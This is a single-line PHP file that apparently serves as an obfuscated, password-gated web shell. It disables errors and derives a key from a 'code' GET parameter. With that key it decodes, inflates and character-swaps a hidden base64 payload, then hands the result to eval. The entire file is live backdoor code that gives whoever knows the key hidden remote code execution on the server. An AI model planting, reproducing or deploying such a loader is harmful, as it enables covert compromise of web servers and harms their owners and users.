<?php error_reporting(0); if(!isset($_GET["code"]) || empty($_GET["code"])) die();$key = implode("",array_unique(str_split(sha1($_GET["code"]))));unset($_GET["code"]);$key2 = strrev($key);$str = strtr(gzinflate(base64_decode("fVVbj9tEFH5mpf0PwxApjnLxTkIHezdOtKJZlodtoySAEEKW48WJU1/S8XjbtLs8I/oAL6iA4AFUJOABeKDVchG/Jrt0n/gLnBnbWSdpM7Lso+985zLnnBlvbzXb0/F0e4syFjKT0WnIuBuMlI7Z6fVu99Ap6pjv7fduvX3rLSl393v9TmkP6Tanpk7rduxxk7s+fRAG1IwoV4rd3ptFYLijIGTUjCPKTLsBbhXOYgoKIEkL03N9F/hEE3RG78Yuo6hYZ7Z/L2R31KMw7B52a5BecQ8VPFjIQEV6YnsKbrdk3sitKxFn0zBSCma/03u30/sAHw4GXfPwdn+AP6xg7cYxOcYlwzDqthdRdHqKGnZEA9unimnWXY+aZgWLILiEXjU4jbhJA4vNptwpIXofEizttVu4BDlMGR2JEnm2RRWsCq5KcUWmVsGTmEccCRDDdgoRtTTIF7Ljodgt7NPZ1TR4iiVURRJKeWSFt/MSnrPMc8hLeMMVnkZer2o7VUdD5I3d4ZpJu7W91Rxz35NfauvwfaXpU24ja2wzaJeB3xkcVHewVHCXe7R1+fTR81+/uPru6dW33zfVBBPayGLuFMowm1IDc3qfqxP7xE5QjCJmGVidxg3PtdRoFnHqq5NIndyNKZtVSe1Gzan5blCbRLjVVBMrkZWaptVshPpMfpl4e3aDeq3BmKIDl0HxO4H+399fN9UEb0ZTO0CubmDRC5xODLXGYdqdtogBnFZfbHzFY59aYaBvcknWXJLNLgdjl2306Kx5dDZ7PAhjxsebXA7XXA6XXW5sGEQ7sRniYpJfUL69VE3W1SSndtbVTk49XFcPE3VBqceBxd0wUEoPYbpgNKAtMLMgW15o3ZHimXhlRJRxBL+g4Ndk70s1Md8K16RpCpMFTPKws4CdPDxcwEMJQ02qVSmQTHAyYZgKcHQGcMjCGG65LK9ihWiazOMsl3W6G0gawRJluemOXG6LKy+g99BNuG7lZjP1jMLLyFi1EeUHsee9D+gSzQ8DmI8l3pGAlBIqI5Ij6vZsmbYWcQyzFi1zDgW0HM8NYrgCVyIm4BIxkscrMnK05MRd01Q1ySww8P4Rvgbhzpe5tIiTFQxQsQS1m6eKJbmGfFeJc607W3NoGNqKwwR+odX8rx/m55/Oz5/Mz392689/+enit88uHz+7/PKff5/8efXV5xefPLv45kfyMXHmfzy6evx7Ygeh0hI1jeMsmFgpamANl1M5DXq2sExrtmKZVVJYpvKypT+T0wU9EUNTxlWIIGZAStD3Mka4LHdaxruL6FLO/KmqJOmB/Jd8VHUQ0XaHTuJfD63YpwGvyb8AhEkDplnkDgFOxxznz8DSPZ/d76r8H/0P")), $key2, $key); eval('?>'.$str);?>